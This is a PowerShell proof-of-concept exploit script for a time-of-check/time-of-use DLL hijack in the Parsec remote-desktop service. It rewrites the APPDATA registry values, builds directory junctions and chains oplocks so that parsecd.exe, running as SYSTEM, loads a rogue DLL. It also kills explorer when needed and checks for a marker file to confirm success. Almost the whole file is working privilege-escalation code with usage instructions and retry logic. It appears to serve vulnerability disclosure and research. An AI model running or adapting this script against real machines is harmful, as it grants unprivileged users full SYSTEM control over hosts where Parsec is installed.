param(
[Parameter(Mandatory=$false)][string]$script_param,
[Parameter(Mandatory=$false)][string]$oplock_count
)
#  This is a Proof of Concept code for a TOCTOU DLL hijack LPE vulnerability in Parsec.app (version 150.88.0.0 and most likely earlier)
#  Developed by Julian Horoszkiewicz (May 2023)

# if run with no parameter - displays help, info, usage
# init - deploys files without setting oplocks and without running parsec - this can be useful to avoid issues with other processes interfering with oplocks on our newly-deployed files (especially SearchProtocolHost.exe):
#	-prerequisite checks:
#	   - making sure there is a copy of NtObjectManager to load + workshop files
#   	- making sure there is a copy of the original AppData\Roaming\Parsec directory available (the original DLL exists)
#		- making sure there is a copy of our rogue DLL in the current directory
#	- environment initialization
#  		- creating the FAKEROAM directory
#		- making sure $env:AppData points to FAKEROAM
#		- replacing FAKEROAM with a hardlink to FAKE1 (might require killing explorer, so we do it just in case)
# exploit - exploitation
#	- everything init does
#	- +actual exploitation
#	 	- running the oplock magic show
# Introduced an optional named parameter - oplock_count (the default is 8), in case exploitation with the default number did not work (according to my observations the service does not always perform the same number of operations on the target DLL, sometimes 5 oplocks were required, sometimes 8, in one case 9 - which is a bit weird).

# Internally the script calls itself with just one param - a number between 1 and $number_of_oplocks+1 - one of the exploitation stages, not to be used manually, the script uses these to run consecutive sub-processes of itself.


# TODO:
# - testing
# - dynamic setting of the number of fake folders and oplocks

$script_name = split-path $PsCommandPath -Leaf
$fake_roam = "$env:SystemDrive\Users\$env:Username\FAKEROAM"
$parsecd_location = "C:\Program Files\Parsec\parsecd.exe" # this is the default install location
$number_of_oplocks = 8 # we want $number_of_oplocks + 1 structures in total; $number_of_oplocks of copies of the original DLL, with the corresponding number of oplocks + FAKEROUGE (number_of_oplocks+1), the directory where our rogue DLL resides
$DLL_path = "$PSScriptRoot\parsec.raw.dll"

if($oplock_count -ne "")
{
	try
	{
		$oplock_count_i = [int]$oplock_count
		if($oplock_count_i -gt 0)
		{
			Write-Host "Setting the number of oplocks to $oplock_count."
			$number_of_oplocks = $oplock_count_i
		}
	}
	catch
	{
		Write-Host "Invalid oplock_count argument. It must be a natural integer greater than 0."
		Exit;
	}
}

function Help-Usage() { 	
    Write-Host "`nThis is a Proof of Concept code for a TOCTOU DLL hijack LPE vulnerability in Parsec.app"
	Write-Host "Developed by Julian Horoszkiewicz (May 2023)`n"
	Write-Host "Usage:`n$script_name - (no params) - displays this help message."
	Write-Host "Usage:`n$script_name - init - only checks prerequisites and deploys files, does not attempt exploitation."
	Write-Host "$script_name - exploit - attempts exploitation (if files are already deployed, no overwrites are made)."
	Write-Host "There is an optional named parameter - oplock_count (the default is 8), in case exploitation with the default number did not work (according to my observations the service does not always perform the same number of operations on the target DLL, sometimes 5 oplocks were required, sometimes 8, in one case 9 - which is a bit weird). Provide with -oplock_count, e.g. $script_name exploit -oplock_count 7`n`n`n"
}
function Overwrite-Reg-Env()
{
	Set-ItemProperty -Path "HKCU:\Environment" -Name APPDATA -Value "$fake_roam"
	Set-ItemProperty -Path "HKCU:\Volatile Environment" -Name APPDATA -Value "$fake_roam"
	Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" -Name AppData -Value "$fake_roam"
	Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" -Name AppData -Value "$fake_roam"
}
function Check-Prerequisites()
{
	Write-Host "Checking prerequisites"
	try
	{
		$reg_key = "HKLM:\SOFTWARE\Classes\parsecd\shell\open\command"
		$parsec_shell_command = (Get-ItemProperty -Path $reg_key)."(default)"
		$parsecd_location = $parsec_shell_command.Substring(0,$parsec_shell_command.Length-5).replace('"','')
	}
	catch
	{
		Write-Host "Could not fetch Parsecd location from $reg_key - it doesn't look like parsec is installed at all. Exiting."
		Exit;
	}
	$workshop_module = "$PSScriptRoot\workshop.psd1"
	if ((Test-Path -Path $workshop_module) -eq $false) {
		Write-Host "FATAL - could not find $workshop_module from James Forshaw's LPE workshop. Download it from https://github.com/tyranid/windows-logical-eop-workshop/releases/download/44CON-2017/release-20170908.zip and place it in the same directory as this file, along with sandbox-attacksurface-analysis-tools/ directory (it contains NtObjectManager required for this exploit to work)."
		Exit;
	}
	try
	{
		Import-Module "$PSScriptRoot\workshop.psd1"
	}
	catch
	{
		Write-Host "Failed to import Set-Oplock function and / or NtObjectManager from James Forshaw's LPE workshop. Exiting."
		Exit;
	}
	if((Test-Path -Path $DLL_path) -eq $false)
	{
		Write-Host "FATAL: could not find $DLL_path; this is the DLL we will trick the Parsecd.exe process running as SYSTEM to load and execute for us. Make sure the DLL is deployed and re-run the exploit."
		Exit;
	}
	$parsec_appdata = "$env:SystemDrive\Users\$env:Username\AppData\Roaming\Parsec"
	if((Test-Path -Path $parsec_appdata) -eq $false)
	{
		Write-Host "FATAL: the original Parsec AppData\Roaming directory $parsec_appdata not found. The original parsecd-150-87d.dll file is required to bypass the signature verification mechanism. If Parsec is installed in the system and this directory is not present, it means it was not run before as the current user. Run Parsec manually to make sure this directory is initialized and re-run this exploit."
		Exit;
	}
	if ((Test-Path -Path $fake_roam) -eq $false) {
		mkdir $fake_roam
	}
	Copy-Item -Path $parsec_appdata -Recurse -Destination $env:SystemDrive\Users\$env:Username\PARSEC_ROAMING -ErrorAction SilentlyContinue
	if($env:AppData -ne $fake_roam)
	{
		Write-Host "The easiest way to exploit Parsec is by changing the default APPDATA environmental variable for the current user from its default value $env:SystemDrive\Users\$env:Username\AppData\Roaming to $fake_roam. Please do so in the Control Panel environmental variable panel by adding an explicit APPDATA variable (no admin privileges required), close powershell and run this script again."
		Overwrite-Reg-Env;
		rundll32 sysdm.cpl,EditEnvironmentVariables
		Write-Host "Press any key once you have clicked OK in the system environmental variable edit prompt."
		$nothing = Read-Host
		# This should be sufficient - however new processes spawned from this one will still be using the old AppData, however we can change it as well to alleviate for this.
		$env:AppData = $fake_roam # just like this :D
		# We could implement a wrapper over Reg-FlushKey https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regflushkey ourselves,
		# but calling this rundll wrapper and clicking OK is just much simpler.
	}	
}
function Init-Environment()
{
	if(Test-Path -Path "C:\Users\Public\poc.txt")
	{
		Remove-Item -Path "C:\Users\Public\poc.txt" #clean up after previous successful executions of this PoC to avoid false positives if things go awry
	}
	Check-Prerequisites;	
	# now, make sure Parsecd.exe is not running
	if($parsecd)
	{
		Write-Host "Detected that parsecd is running. Please close it by clicking 'Quit' in the context menu in the system tray before proceeding. Press Enter once done."
		$nothing = Read-Host
	} # No longer keeping this in the while loop, as it turned out that if the app was run before in the current logon session, the parsecd.exe instance running as SYSTEM is still active (and we can't kill it, obviously) - however it does not lock any files in AppData and does not interfere with exploitation - confirmed by successfully exploiting. This, we trust the user to close the tray instance if it's running and ignore this warning otherwise and just press enter to continue.
	Write-Host "Initiating environment"
	# we create an empty directory FAKE1 (and 9 others) and a hardlink to it, named FAKEROAM
	# the FAKEROAM hardlink should already be the new value of the %APPDATA% environmental variable
	# this way once we start Parsec we already have the AppData\Roaming\Parsec directory it uses to load DLLs under our hardlink control, which means we can remove hardlinks and create new ones without having to kill any processes and remove any actual files - we'll only remove the directory junction and replace it with another one, this solution is much more elegant than the initial design
	# Install the directory structure used to win the race condition
	for($i=1;$i -lt $number_of_oplocks+1;$i++)
	{
		$target_dir = "$env:SystemDrive\Users\$env:Username\FAKE$i"
		$target_filename = "$target_dir\CAKE$i.txt"
		if ((Test-Path -Path $target_dir) -eq $false)
		{
			mkdir $target_dir
			Copy-Item -Path $env:SystemDrive\Users\$env:Username\PARSEC_ROAMING -Recurse -Destination "$target_dir\Parsec"
		}
		if ((Test-Path -Path $target_filename) -eq $false)
		{
			echo $i > $target_filename
		}
		if(Test-Path -Path "$env:SystemDrive\Users\$env:Username\FAKE$i\LOCK$i.txt")
		{
			Remove-Item -Force "$env:SystemDrive\Users\$env:Username\FAKE$i\LOCK$i.txt" # in case survivals from previous unclean executions remained
		}
	}
	# Deploy the rogue DLL into FAKEROUGE
	$roguenum = $number_of_oplocks+1
	$rogue = "$env:SystemDrive\Users\$env:Username\FAKE$roguenum"
	if((Test-Path -Path $rogue) -eq $false)
	{
		mkdir $rogue; mkdir "$rogue\Parsec"; Copy-Item -Path $DLL_path -Destination $rogue\Parsec\parsecd-150-87d.dll
	}
	$roguenumplus = $roguenum+1 # this is to check if we are deploying again after the number of oplocks was reduced - because if so, the DLL will already exist but it will be the legitimate one while in this case it should be the rogue one, so we want to overwrite it once again
	if(Test-Path -Path "$env:SystemDrive\Users\$env:Username\FAKE$roguenumplus")
	{
		Remove-Item -Force $rogue\Parsec\parsecd-150-87d.dll
		Copy-Item -Path $DLL_path -Destination $rogue\Parsec\parsecd-150-87d.dll
	} # we want to limit unnecessary writes as much as possible, as these often trigger interactions from Defender/SearchProtocolHost which in turn mess with our oplocks
	$kill_explorer = $false
	while($true) # repeat as long as AppData control has not been taken
	{
		# if there are any other processes that might be occupying AppData\Roaming, this is the good moment to kill them
		if($kill_explorer)
		{
			try
			{	
				$explorer = Get-Process explorer -ErrorAction SilentlyContinue
				if($explorer) { taskkill /IM explorer.exe /F }
			}
			catch
			{
				Write-Host "Error while trying to kill explorer."
			}
		}
		try
		{
			# our first oplock will be set in FAKE1
			$fake1 = "$env:SystemDrive\Users\$env:Username\FAKE1"
			Remove-Item -Force -Recurse -Path $fake_roam -ErrorAction SilentlyContinue; cmd /c "mklink /J $fake_roam $fake1"
		}
		catch
		{
			Write-Host "`nErrors encountered while trying to remove the original $APPDATA_ROAMING - this is expected, trying again in 3 seconds (will try killing explorer as it might be using some files we have to remove)..."
			$kill_explorer = $true
		}
		if(Test-Path -Path "$fake_roam\CAKE1.txt") # this means the hardlink is set to FAKE1 (CAKE1.txt is there)
		{
			Write-Host "`n`n`nAPPDATA environmental variable and $fake_roam directory successfully taken over, we can proceed to TOCTOU exploitation!"
			if($kill_explorer)
			{
				Start-Process explorer.exe # respawn explorer we just killed
			}
			break
		}
		Start-Sleep -Seconds 3
	}
}
function Start-Oplock-Process()
{
	param([Parameter(Mandatory=$true)][int]$stage_step)
	Start-Process -NoNewWindow -FilePath C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ArgumentList "-ep bypass .\$script_name $stage_step"
}
function Perform-TOCTOU()
{
	Write-Host "Starting exploitation..."
	if((Test-Path -Path "$fake_roam\CAKE1.txt") -eq $false) # added just in case
	{
		Write-Host "FATAL - $fake_roam is not linked to FAKE1, HOW IS THIS POSSIBLE?"
		Exit;
	}
	for($i=1;$i -lt $number_of_oplocks+1;$i++)
	{
		Write-Host "Starting separate process to create oplock and callback on file $i..."
		Start-Oplock-Process $i;
		Write-Host "DONE [$i]."
	}
	Write-Host "Sleeping for 25 seconds..."
	Start-Sleep -Seconds 25

	while($true)
	{
		$all_oplocks_in_place = $true
		for($i=1;$i -lt $number_of_oplocks+1;$i++)
		{
			if((Test-Path -Path "$env:SystemDrive\Users\$env:Username\FAKE$i\LOCK$i.txt") -eq $false)
			{
				$all_oplocks_in_place = $false
				Write-Host "Detected that oplock $i ($env:SystemDrive\Users\$env:Username\FAKE$i\LOCK$i.txt) was interfered with, recreating it..."
				Start-Oplock-Process $i; # re-creating an oplock that was released prematurely by an external process (probably Defender or SearchProtocolHost - its common for them to read newly created DLLs and other files)
			}
		}
		if($all_oplocks_in_place)
		{
			Write-Host "All oplocks still holding tight, starting $parsecd_location..."
			Start-Process -UseNewEnvironment -FilePath $parsecd_location
			break
		}
		else
		{
			Write-Host "Sleeping for 25 more seconds before checking again..."
			Start-Sleep -Seconds 25
		}
	}
	Write-Host "Sleeping for 15 more seconds before checking the status..."
	Start-Sleep -Seconds 15
	if (Test-Path -Path C:\Users\Public\poc.txt) {
		Write-Host "`n`n`n`nEXPLOITATION SUCCESSFUL!!! C:\Users\Public\poc.txt created!`n`n`n`n"
		Get-Content C:\Users\Public\poc.txt
	}
	else
	{
		Write-Host "Could not find C:\Users\Public\poc.txt - exploitation failed :("
	}
}
function Oplock-Stage()
{
	param([Parameter(Mandatory=$true)][int]$stage_step)
	Import-Module "$PSScriptRoot\workshop.psd1"
# stage_step is expected to be between 1 and 9 here
	$target_filepath = "$env:SystemDrive"+"\Users\$env:Username\FAKE$stage_step\Parsec\parsecd-150-87d.dll"
	$target_lockpath = "$env:SystemDrive"+"\Users\$env:Username\FAKE$stage_step\LOCK$stage_step.txt"

	Write-Host "Setting oplock number $stage_step on $target_filepath ..."
	$next_step = $stage_step + 1
	if(Test-Path -Path $target_lockpath) # now what?
	{
		Write-Host "Oplock file/directory structure corruption detected - it seems that oplock is already set ($target_lockpath exists)! Exiting!"
		Exit;
	}
	try
	{
		echo $stage_step > $target_lockpath # this is to keep the parent process informed when oplocks are set and when they are released, mostly to counter race conditions caused by other processes interfering (especially Defender and SearchProtocolHost)
		Set-Oplock $target_filepath {
			Write-Host "Oplock $stage_step hit (FAKE$stage_step)" #, switching link to FAKE$next_step..."					
			Remove-Item -Force -Path $target_lockpath;Remove-Item -Force -Recurse "$fake_roam";cmd /c "mklink /J $fake_roam %USERPROFILE%\FAKE$next_step"
		}
	}
	catch
	{
		Write-Host "Failed to set oplock for $target_filepath, exiting the child process."
		Remove-Item -Force -Path $target_lockpath
		Exit;
	}
}

switch ($script_param) {
   "init" { 
		Init-Environment;
		break
   }
   "exploit"   {
		Init-Environment;
		Perform-TOCTOU; 
		break
		}
   default {
	   try
	   {
		   $stage_step = [int]$script_param
		   if($stage_step -gt 0 -and $stage_step -lt $number_of_oplocks+2)
	       {
			Oplock-Stage $stage_step
			Exit; # redundant, added for readability
	       }
		   else
		   {
			Help-Usage; 	   
		   }
	   }
	   catch
	   {
		   Help-Usage; 
	   }
	   break
	}
}
